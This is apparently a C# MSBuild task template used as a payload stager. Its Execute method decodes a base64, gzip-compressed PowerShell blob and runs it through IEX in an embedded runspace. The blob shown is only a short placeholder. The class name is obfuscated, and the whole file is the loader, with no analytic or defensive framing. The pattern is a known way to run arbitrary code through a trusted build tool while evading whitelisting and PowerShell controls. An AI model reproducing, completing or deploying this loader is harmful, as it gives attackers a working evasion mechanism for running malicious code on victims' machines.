using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class QWEridxnaPO :  Task, ITask {
	public override bool Execute() {
		string pok = "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('IBOE'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.COmpression.CompressionMode]::Decompress))).ReadToEnd();";
		Runspace runspace = RunspaceFactory.CreateRunspace();
		runspace.Open();
		RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
		Pipeline pipeline = runspace.CreatePipeline();
		pipeline.Commands.AddScript(pok);
		pipeline.Invoke();
		runspace.Close();
		return true;
	}
}
